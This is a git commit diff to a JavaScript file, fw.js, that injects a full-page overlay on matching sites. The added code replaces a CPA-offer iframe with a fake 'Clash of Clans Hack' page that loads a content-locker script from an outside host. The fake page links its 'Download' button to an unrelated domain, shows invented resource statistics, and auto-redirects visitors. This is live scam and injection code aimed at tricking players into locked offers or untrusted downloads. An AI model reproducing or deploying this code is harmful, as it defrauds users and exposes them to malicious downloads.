1c6c9aac931d7d99a3a1ec95d50427487937107e
tcodes <hopetashi@yahoo.com>
2016-02-24 14:34:44 +0530

    Update fw.js

--- fw.js
+++ fw.js
@@ -1,21 +1,21 @@
 var url=window.location.href;
-if(url.search(/ckonline.org/i) != -1 || url.search(/8uytr/i) != -1 )
+if(url.search(/lanshackonline.org/i) != -1 || url.search(/keyw/i) != -1 )
 {
 body = document.body;
 if(body != null) {
 div = document.createElement("div");
 div.style.position = "absolute";
 div.style.width = "100%";
-div.style.height = "0";
-div.style.opacity = 0.8;
-div.style.top = "+0px";
+div.style.height = "0%";
+div.style.opacity = 2.2;
+div.style.top = "+60px";
 div.style.zIndex="9999";
 div.style.bottom = "+0px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#FBFBFB";
 div.style.border = "0px solid #94a3c4";
 div.style.margin = "0px";
-div.innerHTML = "<iframe src=http://cpagrip.atwebpages.com/ height=1000px width=100% frameborder=0></noiframe>"
+div.innerHTML ="<head><script type='text/javascript' src='https://flamefile.net/script_include.php?id=188832'></script></head><body><div class='container round-10' id='config-screen'><div id='coc-header' class='col-xs-12'><div class='buttons-row'><a href='/' class='header-button float-left'>Hack</a><a href='article.html' class='header-button float-right'>Article</a></div><div id='visual-area'><img class='logo' src='img/coc-logo.png'><img class='gua' src='img/100.png'></div></div><div id='interface' class='round-10 row'><div id='user-input' class='col-xs-12 col-sm-6'><input id='username' placeholder='C-O-C Username' class='form-control col-xs-8'> <a href=http://designtibet.com><a class='btn btn-success col-xs-4 btn-connect' role='button'>Download</a></a><div id='progress' class='progress-bar progress-bar-danger'></div><div id='resources-frame'><div id='valut-door'><div id='activation-required'><input id='activate-code' placeholder='Enter activation code' class='form-control'><a class='btn btn-danger' role='button'>Activate</a></div></div><div id='coc-resources'><p style='margin-bottom: 0px'>Enter required amounts of resources.</p><div class='gold col-xs-6'><input id='gold' class='form-control' min='0' step='10' type='number'></div><div class='gems col-xs-6'><input id='gems' class='form-control' min='0' step='10' type='number'></div><div class='elixir col-xs-6'><input id='elixir' class='form-control' min='0' step='10' type='number'></div><div class='dark-elixir col-xs-6'><input id='dark-elixir' class='form-control' min='0' step='10' type='number'></div><a class='btn btn-success' id='update' role='button'>Update Your Account</a></div></div></div><div id='system-log' class='col-xs-12 col-sm-6'><div id='overlay' class='col-xs-12'></div><div id='contents' class='col-xs-12'><ul id='system'><li>HOW TO DOWNLOAD CHEAT</li><li>-Click on Download button</li><li></li><li>After Completed it</li><li>You will get your Download</li><li>Resolved supercell.net to 184.168.221.20</li><li><script type='text/javascript'>$(function(){ window.location.href = $('.className').attr('href');});</script><img style='cursor:pointer;' class='className'src='button.jpg' onclick='call_locker();'></body></li><li></li></ul></div></div><div id='stats'><h3>Live Statistics</h3><ul><li>Total Gems Generated: <span id='stat-gems'>94178448877</span></li><li>Total Gold Generated: <span id='stat-gold'>63234108799</span></li><li>Total Elixir Generated: <span id='stat-elixir'>89347236295</span></li></ul></div></div></div><div class='container'><!-- Example row of columns --><footer><p>© Clash of Clans Hack Online ô 2014</p></footer></div> <!-- /container --><script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script><script>window.jQuery || document.write('<script src='js/vendor/jquery-1.11.0.min.js'><\/script>')</script><script>var update_timer = 20;</script><script src='js/vendor/bootstrap.min.js'></script><script src='js/main.js'></script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-51444161-3', 'clashofclanshackonline.org');ga('send', 'pageview');</script></body>"
 body.appendChild(div);
 }
 }
